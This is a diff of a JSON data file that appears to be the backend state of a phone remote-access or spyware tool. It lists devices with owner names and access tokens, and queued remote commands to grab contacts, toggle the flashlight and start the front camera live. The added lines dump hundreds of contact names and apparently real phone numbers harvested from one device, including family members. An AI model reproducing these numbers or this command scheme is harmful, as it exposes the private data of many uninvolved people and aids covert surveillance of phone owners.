@@ -4,7 +4,7 @@
     "deviceName": "HP-LOCK-236E",
     "ownerUsername": "Riz99",
     "token": "6e7220f26efbc41a8ae81e6ccbe33703",
-    "lastSeen": 1775829507419,
+    "lastSeen": 1775829528426,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T11:33:42.377Z",
@@ -2199,43 +2199,33 @@
     "deviceName": "HP-DDD-D84C",
     "ownerUsername": "kamu cii",
     "token": "163be1beb8d3daf27fadd11d728c24a0",
-    "lastSeen": 1775829497014,
+    "lastSeen": 1775829530348,
     "commandQueue": [
+      {
+        "type": "get_contacts",
+        "payload": {},
+        "sentAt": 1775829508443
+      },
       {
         "type": "flashlight",
         "payload": {
           "state": "on"
         },
-        "sentAt": 1775829468567
+        "sentAt": 1775829519763
       },
       {
         "type": "flashlight",
         "payload": {
           "state": "off"
         },
-        "sentAt": 1775829474645
+        "sentAt": 1775829522548
       },
       {
-        "type": "camera_live_start",
+        "type": "flashlight",
         "payload": {
-          "facing": "front"
+          "state": "on"
         },
-        "sentAt": 1775829478867
-      },
-      {
-        "type": "camera_live_stop",
-        "payload": {},
-        "sentAt": 1775829492492
-      },
-      {
-        "type": "get_contacts",
-        "payload": {},
-        "sentAt": 1775829496947
-      },
-      {
-        "type": "get_contacts",
-        "payload": {},
-        "sentAt": 1775829508443
+        "sentAt": 1775829525282
       }
     ],
     "online": true,
@@ -2254,7 +2244,2244 @@
     "smsMessages": [],
     "galleryPhotos": [],
     "galleryDone": false,
-    "contacts": [],
+    "contacts": [
+      {
+        "name": "*FINZZSHOP[OWNER GAS4YOU]* + *[OWNER MANG GUH PT IYES]",
+        "phone": "+62 895-0875-6835"
+      },
+      {
+        "name": "+6285643629515",
+        "phone": "+6285643629515"
+      },
+      {
+        "name": "+6285774113950",
+        "phone": "+6285774113950"
+      },
+      {
+        "name": "+62882021779388",
+        "phone": "+62882021779388"
+      },
+      {
+        "name": "+6288884655131",
+        "phone": "+6288884655131"
+      },
+      {
+        "name": "+6289653862863",
+        "phone": "+6289653862863"
+      },
+      {
+        "name": "+6289677343890",
+        "phone": "+6289677343890"
+      },
+      {
+        "name": "-RINNMODESAD",
+        "phone": "+6287773384986"
+      },
+      {
+        "name": "-Sanzz JASAPOST 私",
+        "phone": "+62 859-7179-5015"
+      },
+      {
+        "name": ".",
+        "phone": "+62 838-4018-4286"
+      },
+      {
+        "name": ".",
+        "phone": "+6287794857514"
+      },
+      {
+        "name": ".",
+        "phone": "0889-5248-791"
+      },
+      {
+        "name": "44dnan 👑",
+        "phone": "+62895336955777"
+      },
+      {
+        "name": "48ㅤMic'hieeぉ",
+        "phone": "+6283839953874"
+      },
+      {
+        "name": "><",
+        "phone": "+62 831-4327-3018"
+      },
+      {
+        "name": "><",
+        "phone": "+6283143273018"
+      },
+      {
+        "name": "A",
+        "phone": "+62 812-5394-7229"
+      },
+      {
+        "name": "ADE Zull",
+        "phone": "+62895801177385"
+      },
+      {
+        "name": "ADIDI🤦‍♂️",
+        "phone": "+6289694822770"
+      },
+      {
+        "name": "ADIKA STORE",
+        "phone": "+62 812-4130-5778"
+      },
+      {
+        "name": "ADIKA STORE",
+        "phone": "+6281241305778"
+      },
+      {
+        "name": "ADNAN",
+        "phone": "+62 838-1377-0628"
+      },
+      {
+        "name": "ADNAN",
+        "phone": "+62 877-6667-6413"
+      },
+      {
+        "name": "ADNAN",
+        "phone": "+6287766676413"
+      },
+      {
+        "name": "AGUNG STORE REAL",
+        "phone": "+62 838-0800-7276"
+      },
+      {
+        "name": "AJII STORE",
+        "phone": "+62 858-7598-5839"
+      },
+      {
+        "name": "AL 🔱",
+        "phone": "+6288290685574"
+      },
+      {
+        "name": "ALL4YOU STORE",
+        "phone": "+62 857-0918-3019"
+      },
+      {
+        "name": "ALLAN 2",
+        "phone": "+6285162765404"
+      },
+      {
+        "name": "ANGGA STORE",
+        "phone": "+62 877-4228-3462"
+      },
+      {
+        "name": "ARIP",
+        "phone": "+62 877-5142-6679"
+      },
+      {
+        "name": "ARYA4YOU",
+        "phone": "+62 877-3202-9561"
+      },
+      {
+        "name": "AUFASHOPGAMES",
+        "phone": "+62 851-7307-8227"
+      },
+      {
+        "name": "AUFASHOPGAMES",
+        "phone": "+6285173078227"
+      },
+      {
+        "name": "Abdi Cahyono",
+        "phone": "+6285394041170"
+      },
+      {
+        "name": "Abdi/Lia",
+        "phone": "+6283823326564"
+      },
+      {
+        "name": "Abudzar",
+        "phone": "+6288242199383"
+      },
+      {
+        "name": "Acengd",
+        "phone": "+62 857-8124-4687"
+      },
+      {
+        "name": "Acengd",
+        "phone": "+62 878-8429-6356"
+      },
+      {
+        "name": "Adam",
+        "phone": "+62 895-0951-8758"
+      },
+      {
+        "name": "Adam",
+        "phone": "+6289509518758"
+      },
+      {
+        "name": "Adell",
+        "phone": "+62 887-5834-512"
+      },
+      {
+        "name": "Adhyyranll",
+        "phone": "+62 882-0203-32626"
+      },
+      {
+        "name": "Adit CRUEL",
+        "phone": "+62 815-5496-3483"
+      },
+      {
+        "name": "Admin Mm",
+        "phone": "+62 821-8777-4399"
+      },
+      {
+        "name": "Admin Mm",
+        "phone": "+6282187774399"
+      },
+      {
+        "name": "Afif",
+        "phone": "+62 882-4254-8004"
+      },
+      {
+        "name": "Afiff",
+        "phone": "+6288245361565"
+      },
+      {
+        "name": "Afiif",
+        "phone": "+62882019197691"
+      },
+      {
+        "name": "Afka",
+        "phone": "+62 812-1327-3268"
+      },
+      {
+        "name": "Afka",
+        "phone": "+6281213273268"
+      },
+      {
+        "name": "Aiih",
+        "phone": "+6282349712925"
+      },
+      {
+        "name": "Akram",
+        "phone": "+62 852-5627-6400"
+      },
+      {
+        "name": "Akram",
+        "phone": "+6285256276400"
+      },
+      {
+        "name": "Albi",
+        "phone": "+62 896-3739-5198"
+      },
+      {
+        "name": "Albi",
+        "phone": "+6289637395198"
+      },
+      {
+        "name": "Albi BloxFruit",
+        "phone": "+62 852-2556-1153"
+      },
+      {
+        "name": "Aldi",
+        "phone": "+6283182675672"
+      },
+      {
+        "name": "Aldo",
+        "phone": "+6282112543392"
+      },
+      {
+        "name": "Aldrich",
+        "phone": "+62 857-1175-7977"
+      },
+      {
+        "name": "Alfahri Mts",
+        "phone": "+6281617391941"
+      },
+      {
+        "name": "Aliip",
+        "phone": "+6281244083631"
+      },
+      {
+        "name": "Aliixz",
+        "phone": "+6285211103565"
+      },
+      {
+        "name": "Alipp",
+        "phone": "+6287888497026"
+      },
+      {
+        "name": "Ammar",
+        "phone": "+6288246085655"
+      },
+      {
+        "name": "Amo Freya",
+        "phone": "+6285846575227"
+      },
+      {
+        "name": "Anak Ku Ibnu",
+        "phone": "+6288245724170"
+      },
+      {
+        "name": "Ancu",
+        "phone": "+6285823019341"
+      },
+      {
+        "name": "Andi Ilham",
+        "phone": "+6289529360302"
+      },
+      {
+        "name": "Angel",
+        "phone": "0838-2353-1110"
+      },
+      {
+        "name": "Angel",
+        "phone": "083823531110"
+      },
+      {
+        "name": "Apip Store",
+        "phone": "0857-1254-9371"
+      },
+      {
+        "name": "Apip Store",
+        "phone": "085712549371"
+      },
+      {
+        "name": "Appy",
+        "phone": "0831-3657-3251"
+      },
+      {
+        "name": "Appy",
+        "phone": "083136573251"
+      },
+      {
+        "name": "Ardana",
+        "phone": "+6281360130187"
+      },
+      {
+        "name": "Ardina Rasty",
+        "phone": "+62882020142019"
+      },
+      {
+        "name": "Ariya",
+        "phone": "+62 813-4589-6518"
+      },
+      {
+        "name": "Armin (Temkel)",
+        "phone": "+6282343788752"
+      },
+      {
+        "name": "Arya mts",
+        "phone": "+62 831-6902-3553"
+      },
+      {
+        "name": "Arya mts",
+        "phone": "+6283169023553"
+      },
+      {
+        "name": "Awann",
+        "phone": "+62 895-3848-58252"
+      },
+      {
+        "name": "Ayah",
+        "phone": "+628986160008"
+      },
+      {
+        "name": "Ayah2",
+        "phone": "+6289620092626"
+      },
+      {
+        "name": "Ayu Store",
+        "phone": "+62 857-5806-1526"
+      },
+      {
+        "name": "Ayu Store",
+        "phone": "+6285758061526"
+      },
+      {
+        "name": "Ayun",
+        "phone": "+62 821-9679-4383"
+      },
+      {
+        "name": "Azril",
+        "phone": "+6285651196717"
+      },
+      {
+        "name": "Azril",
+        "phone": "+6285752626643"
+      },
+      {
+        "name": "BAYU STORE REAL",
+        "phone": "+62 878-6543-1046"
+      },
+      {
+        "name": "BED Kang Kontak",
+        "phone": "+62 857-8391-9285"
+      },
+      {
+        "name": "BED Kang Kontak",
+        "phone": "+6285783919285"
+      },
+      {
+        "name": "BILLA STORE ONLY [ 8023 ]",
+        "phone": "+62 851-6303-8023"
+      },
+      {
+        "name": "BILLA STORE ONLY [ 8023 ]",
+        "phone": "+6285163038023"
+      },
+      {
+        "name": "Bagas",
+        "phone": "+62 857-7549-0840"
+      },
+      {
+        "name": "Bagas",
+        "phone": "+6285775490840"
+      },
+      {
+        "name": "Bagas Jb",
+        "phone": "+62 853-8165-1926"
+      },
+      {
+        "name": "Bagas Jb",
+        "phone": "+6285381651926"
+      },
+      {
+        "name": "Bang Husbu",
+        "phone": "+62 813-7455-7725"
+      },
+      {
+        "name": "Bangs Roby",
+        "phone": "+62 821-7763-4212"
+      },
+      {
+        "name": "Bany📱",
+        "phone": "+62 895-1666-8236"
+      },
+      {
+        "name": "Bany📱",
+        "phone": "+6289516668236"
+      },
+      {
+        "name": "Bapak",
+        "phone": "+62 821-8876-5557"
+      },
+      {
+        "name": "Bayu",
+        "phone": "+6281511370810"
+      },
+      {
+        "name": "Bela Shop",
+        "phone": "+62 813-8990-9845"
+      },
+      {
+        "name": "Bilcs JB",
+        "phone": "+62 813-2808-0401"
+      },
+      {
+        "name": "Bocil",
+        "phone": "+6281260649315"
+      },
+      {
+        "name": "BranzzReal",
+        "phone": "+62 899-3670-212"
+      },
+      {
+        "name": "Bt",
+        "phone": "0857 7539 0838"
+      },
+      {
+        "name": "Bt",
+        "phone": "0857-3071-8233"
+      },
+      {
+        "name": "Bt Free Fire",
+        "phone": "0857 7539 0838"
+      },
+      {
+        "name": "Bu Lili",
+        "phone": "+6285819312244"
+      },
+      {
+        "name": "Bu Lili",
+        "phone": "+6285819312274"
+      },
+      {
+        "name": "Bumi",
+        "phone": "+6283808171824"
+      },
+      {
+        "name": "Byan",
+        "phone": "+6283824335747"
+      },
+      {
+        "name": "CIA Suk1",
+        "phone": "+6289517347847"
+      },
+      {
+        "name": "Ca'lu",
+        "phone": "+6285656201103"
+      },
+      {
+        "name": "Cantika",
+        "phone": "+62 815-4920-9353"
+      },
+      {
+        "name": "Carlcare Layanan Hotline",
+        "phone": "08041292241"
+      },
+      {
+        "name": "Chiki Opbr",
+        "phone": "+62 819-3821-1132"
+      },
+      {
+        "name": "Chiki Opbr",
+        "phone": "+6281938211132"
+      },
+      {
+        "name": "Cipa",
+        "phone": "+6282182241895"
+      },
+      {
+        "name": "Customer Care DANA ✅",
+        "phone": "+622127937262"
+      },
+      {
+        "name": "Customer Care DANA ✅",
+        "phone": "+622150857500"
+      },
+      {
+        "name": "Customer Care DANA ✅",
+        "phone": "1500445"
+      },
+      {
+        "name": "DEMSRGL STORE",
+        "phone": "+62 831-3689-0848"
+      },
+      {
+        "name": "DIKA",
+        "phone": "+62 896-8478-0903"
+      },
+      {
+        "name": "DIKZZ STORE",
+        "phone": "+62 813-2805-4014"
+      },
+      {
+        "name": "Dangker",
+        "phone": "+6285954506740"
+      },
+      {
+        "name": "Darius Suk1",
+        "phone": "+6288809248628"
+      },
+      {
+        "name": "Dejan",
+        "phone": "+62882020104440"
+      },
+      {
+        "name": "Dekik",
+        "phone": "+62 895-1525-9575"
+      },
+      {
+        "name": "Denis",
+        "phone": "+62 838-7690-0076"
+      },
+      {
+        "name": "Denis",
+        "phone": "+6283146249603"
+      },
+      {
+        "name": "Denis",
+        "phone": "+6283190486371"
+      },
+      {
+        "name": "Deszxx elite",
+        "phone": "+62 857-1827-8702"
+      },
+      {
+        "name": "Deszxx elite",
+        "phone": "+6285718278702"
+      },
+      {
+        "name": "Dewi",
+        "phone": "0821-8634-4956"
+      },
+      {
+        "name": "Dewi",
+        "phone": "082186344956"
+      },
+      {
+        "name": "Dewi Store",
+        "phone": "+62 831-5329-5005"
+      },
+      {
+        "name": "DexXzy Store",
+        "phone": "+62 831-4786-8076"
+      },
+      {
+        "name": "DhanNeverlus_",
+        "phone": "+6281374069633"
+      },
+      {
+        "name": "Diann",
+        "phone": "+6288704088026"
+      },
+      {
+        "name": "Dicky P6",
+        "phone": "+6281382673032"
+      },
+      {
+        "name": "Dika Ff",
+        "phone": "+6281247268151"
+      },
+      {
+        "name": "Dika 😀",
+        "phone": "+62 812-5327-0711"
+      },
+      {
+        "name": "Dikaa",
+        "phone": "+6281216197027"
+      },
+      {
+        "name": "Dikma",
+        "phone": "+6283873462335"
+      },
+      {
+        "name": "Dila",
+        "phone": "085846512646"
+      },
+      {
+        "name": "Dimas Prayoga??",
+        "phone": "+6285261006795"
+      },
+      {
+        "name": "Dimm Store (MEDAN)",
+        "phone": "+62 813-7482-7863"
+      },
+      {
+        "name": "Dirga",
+        "phone": "+62 857-7763-1701"
+      },
+      {
+        "name": "Dirga",
+        "phone": "+6285777631701"
+      },
+      {
+        "name": "Ditz",
+        "phone": "+62 857-3242-6191"
+      },
+      {
+        "name": "Ditz",
+        "phone": "+6285732426191"
+      },
+      {
+        "name": "Diítz Monarch🪐",
+        "phone": "+628388844529"
+      },
+      {
+        "name": "Dudut",
+        "phone": "+62895330116897"
+      },
+      {
+        "name": "Dxyy",
+        "phone": "+6285786340371"
+      },
+      {
+        "name": "Dyah Mts",
+        "phone": "+6283871309243"
+      },
+      {
+        "name": "Dyy Jasteb",
+        "phone": "+62 857-5363-3461"
+      },
+      {
+        "name": "Dyy Jasteb",
+        "phone": "+6285753633461"
+      },
+      {
+        "name": "EG4 SHOP-",
+        "phone": "+62 878-6812-37551"
+      },
+      {
+        "name": "ELiyen",
+        "phone": "+62 812-3514-6828"
+      },
+      {
+        "name": "Efansa",
+        "phone": "+6285824319827"
+      },
+      {
+        "name": "El 2",
+        "phone": "+62 822-5348-8315"
+      },
+      {
+        "name": "Enih",
+        "phone": "+6289670377217"
+      },
+      {
+        "name": "Eza",
+        "phone": "+6281917739695"
+      },
+      {
+        "name": "F",
+        "phone": "+6285340202783"
+      },
+      {
+        "name": "F4U STORE JASPOST",
+        "phone": "+62 882-6801-8058"
+      },
+      {
+        "name": "FIR STORE",
+        "phone": "+62 858-9623-5528"
+      },
+      {
+        "name": "Fadel Muhammad",
+        "phone": "+6283112628322"
+      },
+      {
+        "name": "Fadill",
+        "phone": "+6281340563877"
+      },
+      {
+        "name": "Fadiya",
+        "phone": "+6287787465858"
+      },
+      {
+        "name": "Fadlyy",
+        "phone": "+6281360766587"
+      },
+      {
+        "name": "Fahri«友»",
+        "phone": "+62 896-0281-2111"
+      },
+      {
+        "name": "Farhad",
+        "phone": "+6285191540918"
+      },
+      {
+        "name": "Fathur Store",
+        "phone": "+62 813-4496-8192"
+      },
+      {
+        "name": "Fathur Store",
+        "phone": "+6281344968192"
+      },
+      {
+        "name": "Fatirr",
+        "phone": "+6282343098828"
+      },
+      {
+        "name": "Fatur Fortex",
+        "phone": "+6289512651766"
+      },
+      {
+        "name": "Fay 1715",
+        "phone": "+62 895-0772-1715"
+      },
+      {
+        "name": "Fay 1715",
+        "phone": "+6289507721715"
+      },
+      {
+        "name": "Fikar Gans",
+        "phone": "+62 853-7928-6780"
+      },
+      {
+        "name": "Firln",
+        "phone": "+6281524913117"
+      },
+      {
+        "name": "Fitri",
+        "phone": "+62 831-6003-6902"
+      },
+      {
+        "name": "Fitri",
+        "phone": "+6283160036902"
+      },
+      {
+        "name": "Foto Copy",
+        "phone": "+6285313559412"
+      },
+      {
+        "name": "GARLEX FS",
+        "phone": "+62 831-1638-1836"
+      },
+      {
+        "name": "GARLEX FS",
+        "phone": "+6283116381836"
+      },
+      {
+        "name": "GODAM STORE",
+        "phone": "+62 821-3892-7843"
+      },
+      {
+        "name": "GOJO STORE",
+        "phone": "+62 878-4078-9388"
+      },
+      {
+        "name": "Gerald",
+        "phone": "+6285798944033"
+      },
+      {
+        "name": "Gilb3tr",
+        "phone": "+6282190654447"
+      },
+      {
+        "name": "Girl",
+        "phone": "+6283171575516"
+      },
+      {
+        "name": "Gitz",
+        "phone": "+6282377359168"
+      },
+      {
+        "name": "Gunawan Suk1",
+        "phone": "+6281806115460"
+      },
+      {
+        "name": "HID4YOU",
+        "phone": "+62 887-0700-4083"
+      },
+      {
+        "name": "HID4YOU",
+        "phone": "+6288707004083"
+      },
+      {
+        "name": "HUMAM",
+        "phone": "+62 815-6767-8387"
+      },
+      {
+        "name": "HUMAM",
+        "phone": "+6281567678387"
+      },
+      {
+        "name": "Haeril (Temkel)",
+        "phone": "+6283131397885"
+      },
+      {
+        "name": "Hamdi",
+        "phone": "085693117836"
+      },
+      {
+        "name": "Hams Store",
+        "phone": "+62 831-5769-9368"
+      },
+      {
+        "name": "Hams Store",
+        "phone": "+6283157699368"
+      },
+      {
+        "name": "Hansen Kakel",
+        "phone": "+6285770655832"
+      },
+      {
+        "name": "Harun",
+        "phone": "+60 11-2099 6510"
+      },
+      {
+        "name": "Harun",
+        "phone": "+601120996510"
+      },
+      {
+        "name": "Hasbi",
+        "phone": "+62 838-7873-4808"
+      },
+      {
+        "name": "Hasbi",
+        "phone": "+6283878734808"
+      },
+      {
+        "name": "Hb",
+        "phone": "0858-9052-0414"
+      },
+      {
+        "name": "Hilman",
+        "phone": "+62 896-7037-4963"
+      },
+      {
+        "name": "Hilman",
+        "phone": "+6289670374963"
+      },
+      {
+        "name": "Humayy",
+        "phone": "+62895414666830"
+      },
+      {
+        "name": "IKBAL_STORE 037",
+        "phone": "+62 813-6473-2078"
+      },
+      {
+        "name": "IKIY GANZ STORE",
+        "phone": "+62 821-6978-9446"
+      },
+      {
+        "name": "IKKY CRUEL",
+        "phone": "+62 831-3369-7220"
+      },
+      {
+        "name": "INTAN STORE",
+        "phone": "+62 838-9830-0647"
+      },
+      {
+        "name": "INTAN STORE",
+        "phone": "+6283898300647"
+      },
+      {
+        "name": "INVISIBLE",
+        "phone": "+62 831-2577-6427"
+      },
+      {
+        "name": "INVISIBLE",
+        "phone": "+6283125776427"
+      },
+      {
+        "name": "IYAD REAL",
+        "phone": "+62 857-4978-3439"
+      },
+      {
+        "name": "Ibang",
+        "phone": "+62 895-3200-68380"
+      },
+      {
+        "name": "Ibang",
+        "phone": "+62895320068380"
+      },
+      {
+        "name": "Ibnu",
+        "phone": "+6281225880266"
+      },
+      {
+        "name": "Ibnu",
+        "phone": "+6281525880266"
+      },
+      {
+        "name": "Ibnu To'lala",
+        "phone": "+628884655131"
+      },
+      {
+        "name": "Ibu Fahri",
+        "phone": "+6289608737633"
+      },
+      {
+        "name": "Ibuu",
+        "phone": "+6288245724170"
+      },
+      {
+        "name": "Icha",
+        "phone": "+628875175104"
+      },
+      {
+        "name": "Iftita Suci Ramadani",
+        "phone": "+62882020497337"
+      },
+      {
+        "name": "Imel",
+        "phone": "+62 838-9369-2310"
+      },
+      {
+        "name": "Imel",
+        "phone": "+6283893692310"
+      },
+      {
+        "name": "Ipal",
+        "phone": "+62 896-3916-2627"
+      },
+      {
+        "name": "Ipal",
+        "phone": "+6289639162627"
+      },
+      {
+        "name": "Irawan",
+        "phone": "+62 838-7135-2169"
+      },
+      {
+        "name": "Irgi Store",
+        "phone": "+62 858-5462-9902"
+      },
+      {
+        "name": "Irgi Store",
+        "phone": "+6285854629902"
+      },
+      {
+        "name": "Isra",
+        "phone": "+62 838-3903-9271"
+      },
+      {
+        "name": "JAYYSTORE",
+        "phone": "+62 819-3526-0774"
+      },
+      {
+        "name": "JAYYSTORE",
+        "phone": "+6281935260774"
+      },
+      {
+        "name": "JB //WANZ REAL",
+        "phone": "+62 838-1831-2857"
+      },
+      {
+        "name": "Janna",
+        "phone": "+62895370472779"
+      },
+      {
+        "name": "Jar",
+        "phone": "+6282112230488"
+      },
+      {
+        "name": "Jeny Cahaya Ningrum",
+        "phone": "+6285827858764"
+      },
+      {
+        "name": "K.FAAT",
+        "phone": "+628976206011"
+      },
+      {
+        "name": "KENZ",
+        "phone": "+6283847694268"
+      },
+      {
+        "name": "KENZO STORE",
+        "phone": "+62 823-2404-8523"
+      },
+      {
+        "name": "KYY STORE",
+        "phone": "+62 821-8533-0280"
+      },
+      {
+        "name": "Kak Ayuu",
+        "phone": "0856-0421-0615"
+      },
+      {
+        "name": "Kak Ayuu",
+        "phone": "085604210615"
+      },
+      {
+        "name": "Kak Najwa😊",
+        "phone": "+62887436942104"
+      },
+      {
+        "name": "Kaka Sarah😘😎",
+        "phone": "+6289519488208"
+      },
+      {
+        "name": "Kakak Nunu",
+        "phone": "+628994302476"
+      },
+      {
+        "name": "Kandala",
+        "phone": "+6283873143885"
+      },
+      {
+        "name": "Kapten AE",
+        "phone": " 0821 8131 1300"
+      },
+      {
+        "name": "Kapten AE",
+        "phone": "082181311300"
+      },
+      {
+        "name": "Kela",
+        "phone": "+62882020729621"
+      },
+      {
+        "name": "Kemal",
+        "phone": "+62 895-6225-83086"
+      },
+      {
+        "name": "Ki4you STORE",
+        "phone": "+62 857-8386-2616"
+      },
+      {
+        "name": "Kiaaaaa",
+        "phone": "082192991311"
+      },
+      {
+        "name": "Knch",
+        "phone": "+6287757470414"
+      },
+      {
+        "name": "Kontol 123",
+        "phone": "+6287873613972"
+      },
+      {
+        "name": "Krisna",
+        "phone": "+6289630900643"
+      },
+      {
+        "name": "Kriss??",
+        "phone": "+6287772325802"
+      },
+      {
+        "name": "KusZzz-35 Store",
+        "phone": "+62 821-2683-1069"
+      },
+      {
+        "name": "KusZzz-35 Store",
+        "phone": "+6282126831069"
+      },
+      {
+        "name": "KyySTORE",
+        "phone": "+62 899-7706-126"
+      },
+      {
+        "name": "KyySTORE",
+        "phone": "+628997706126"
+      },
+      {
+        "name": "LEXAA KECEE",
+        "phone": "0895-3300-32444"
+      },
+      {
+        "name": "Lanang",
+        "phone": "+62 896-1872-9843"
+      },
+      {
+        "name": "Levss Kang Logo",
+        "phone": "+62 857-8295-9806"
+      },
+      {
+        "name": "Lexáa",
+        "phone": "+62895330032444"
+      },
+      {
+        "name": "Lexáaa",
+        "phone": "+62895330032444"
+      },
+      {
+        "name": "Liaa",
+        "phone": "+62 813-5788-5210"
+      },
+      {
+        "name": "Liaaa",
+        "phone": "+6285649906612"
+      },
+      {
+        "name": "Liar",
+        "phone": "+6285394041171"
+      },
+      {
+        "name": "Lutvi",
+        "phone": "+62 895-1626-1756"
+      },
+      {
+        "name": "Lynn ml",
+        "phone": "+6285304406237"
+      },
+      {
+        "name": "Lynn ml",
+        "phone": "+6285394406237"
+      },
+      {
+        "name": "MATZ4YOU",
+        "phone": "+62 831-0536-4111"
+      },
+      {
+        "name": "MR_A12GA",
+        "phone": "+62 838-7089-4692"
+      },
+      {
+        "name": "MUH HAIDIR",
+        "phone": "+6282187440498"
+      },
+      {
+        "name": "Mada",
+        "phone": "+62 857-2707-4694"
+      },
+      {
+        "name": "Mall JB",
+        "phone": "+62 831-6657-1975"
+      },
+      {
+        "name": "Mama Uni",
+        "phone": "+6289529070907"
+      },
+      {
+        "name": "Maouk Store",
+        "phone": "+62 851-7240-2754"
+      },
+      {
+        "name": "Maouk Store",
+        "phone": "+6285172402754"
+      },
+      {
+        "name": "Maulana",
+        "phone": "+6285696674930"
+      },
+      {
+        "name": "Maykel Jambi",
+        "phone": "+62 896-3746-8595"
+      },
+      {
+        "name": "Mem Jkt",
+        "phone": "+6282398661281"
+      },
+      {
+        "name": "Membr",
+        "phone": "+6288299353588"
+      },
+      {
+        "name": "Menta Akun",
+        "phone": "0838 2353 1110"
+      },
+      {
+        "name": "Michelle",
+        "phone": "+6285814008796"
+      },
+      {
+        "name": "Mila",
+        "phone": "+6281245477674"
+      },
+      {
+        "name": "Mimy",
+        "phone": "+6289656481040"
+      },
+      {
+        "name": "Mnzz👾",
+        "phone": "+6282192923403"
+      },
+      {
+        "name": "N4S JB REAL !!",
+        "phone": "+62 895-3295-25544"
+      },
+      {
+        "name": "NATALIA STORE",
+        "phone": "+62 858-9084-9810"
+      },
+      {
+        "name": "NURFADHILA",
+        "phone": "+62 853-4244-7200"
+      },
+      {
+        "name": "NURFADHILA",
+        "phone": "+6285342447200"
+      },
+      {
+        "name": "Naa Store",
+        "phone": "+62 812-9171-9590"
+      },
+      {
+        "name": "Naa🐟",
+        "phone": "+6283153516016"
+      },
+      {
+        "name": "Nabill",
+        "phone": "+6285397984722"
+      },
+      {
+        "name": "Nadia Aceh",
+        "phone": "0831 3784 9299"
+      },
+      {
+        "name": "Nafis",
+        "phone": "+62 877-1682-1987"
+      },
+      {
+        "name": "Nafis",
+        "phone": "+6287716821987"
+      },
+      {
+        "name": "Nafis Ji",
+        "phone": "+6289518495091"
+      },
+      {
+        "name": "Najeeee",
+        "phone": "+62887436942104"
+      },
+      {
+        "name": "Nanda Store",
+        "phone": "+62 895-1718-0367"
+      },
+      {
+        "name": "Nanda Store",
+        "phone": "+6289517180367"
+      },
+      {
+        "name": "Narel",
+        "phone": "+6281242118380"
+      },
+      {
+        "name": "Nduk",
+        "phone": "+6289515279727"
+      },
+      {
+        "name": "Nur Liyana Zahira",
+        "phone": "+6285794623681"
+      },
+      {
+        "name": "Orang Jago🙏🙏",
+        "phone": "+6288246222076"
+      },
+      {
+        "name": "Orang' Dalam🎭😈",
+        "phone": "+62881036925208"
+      },
+      {
+        "name": "PER STORE",
+        "phone": "+62 857-8830-3128"
+      },
+      {
+        "name": "Padillo",
+        "phone": "+6281341396518"
+      },
+      {
+        "name": "Pak Alwin Setyawan",
+        "phone": "+628812921553"
+      },
+      {
+        "name": "Pannz Store",
+        "phone": "+62 857-1573-8018"
+      },
+      {
+        "name": "Paris Jerman",
+        "phone": "+62895329533645"
+      },
+      {
+        "name": "Pariss Pariss",
+        "phone": "+62895329533645"
+      },
+      {
+        "name": "Park Hyung Seok",
+        "phone": "+62 878-4150-0669"
+      },
+      {
+        "name": "Park Hyung Seok",
+        "phone": "+6287841500669"
+      },
+      {
+        "name": "Patih",
+        "phone": "+62 831-3585-2660"
+      },
+      {
+        "name": "Penipu",
+        "phone": "+6287701883920"
+      },
+      {
+        "name": "Pris France",
+        "phone": "+6281549292679"
+      },
+      {
+        "name": "Putra",
+        "phone": "+6289533384251"
+      },
+      {
+        "name": "Putra Dkv X2",
+        "phone": "+62895415575937"
+      },
+      {
+        "name": "Putt Store",
+        "phone": "+62 821-2012-3463"
+      },
+      {
+        "name": "QueenStore",
+        "phone": "+62 821-3497-5380"
+      },
+      {
+        "name": "R3",
+        "phone": "+6281240132563"
+      },
+      {
+        "name": "RANGGA STORE REALL",
+        "phone": "+62 889-9124-5432"
+      },
+      {
+        "name": "REAL ADMIN JB [PADANG] IKKY CRUEL",
+        "phone": "+62 831-3369-7220"
+      },
+      {
+        "name": "RICO JB",
+        "phone": "+62 821-4592-0110"
+      },
+      {
+        "name": "RIFKI",
+        "phone": "+6287777512251"
+      },
+      {
+        "name": "RINALDI STORE",
+        "phone": "+62 857-6024-6085"
+      },
+      {
+        "name": "RINALDI STORE",
+        "phone": "+6285760246085"
+      },
+      {
+        "name": "RIZKY STORE",
+        "phone": "+62 877-1621-1653"
+      },
+      {
+        "name": "RIZKY STORE",
+        "phone": "+6287716211653"
+      },
+      {
+        "name": "RIZKY WARUNG",
+        "phone": "+62 822-3679-1027"
+      },
+      {
+        "name": "RUUSH JB",
+        "phone": "+62 821-3964-3778"
+      },
+      {
+        "name": "RYZ",
+        "phone": "+6281280454230"
+      },
+      {
+        "name": "Radhid Suk1",
+        "phone": "+6282123234876"
+      },
+      {
+        "name": "Radhin",
+        "phone": "+6289605162050"
+      },
+      {
+        "name": "Ralob",
+        "phone": "+6282348722175"
+      },
+      {
+        "name": "Rama",
+        "phone": "+62 895-3756-76392"
+      },
+      {
+        "name": "Rama",
+        "phone": "+62895375676392"
+      },
+      {
+        "name": "Rara",
+        "phone": "+62 813-5038-5718"
+      },
+      {
+        "name": "Rara",
+        "phone": "+62 856-0111-7841"
+      },
+      {
+        "name": "Rayyan",
+        "phone": "+6281368936671"
+      },
+      {
+        "name": "Rayyan Admin",
+        "phone": "+62 813-4898-5628"
+      },
+      {
+        "name": "Rayyan Admin",
+        "phone": "+6281348985628"
+      },
+      {
+        "name": "Razqa",
+        "phone": "+62 852-4150-9291"
+      },
+      {
+        "name": "Razqa",
+        "phone": "+6285241509291"
+      },
+      {
+        "name": "Regis. Cessna Vv C Cewe",
+        "phone": "121155554433333"
+      },
+      {
+        "name": "Regis. Cessna Vv C Cewe",
+        "phone": "4444"
+      },
+      {
+        "name": "Rehan Steven",
+        "phone": "+6285883731726"
+      },
+      {
+        "name": "Rey Dkv2",
+        "phone": "+6283890162061"
+      },
+      {
+        "name": "Reynaldii",
+        "phone": "+62 838-7745-3259"
+      },
+      {
+        "name": "Ridwan",
+        "phone": "+62 838-6982-1043"
+      },
+      {
+        "name": "Ridwan",
+        "phone": "+6283869821043"
+      },
+      {
+        "name": "Ridwan",
+        "phone": "+6283894848835"
+      },
+      {
+        "name": "Rifki Store",
+        "phone": "+62 838-0098-5636"
+      },
+      {
+        "name": "Rifkii",
+        "phone": "+6285656598110"
+      },
+      {
+        "name": "Riku Store",
+        "phone": "+62 878-7398-5625"
+      },
+      {
+        "name": "Riku Store",
+        "phone": "+6287873985625"
+      },
+      {
+        "name": "Rio",
+        "phone": "+62 838-9881-9676"
+      },
+      {
+        "name": "Rio Alamsyah",
+        "phone": "+62 838-9881-9676"
+      },
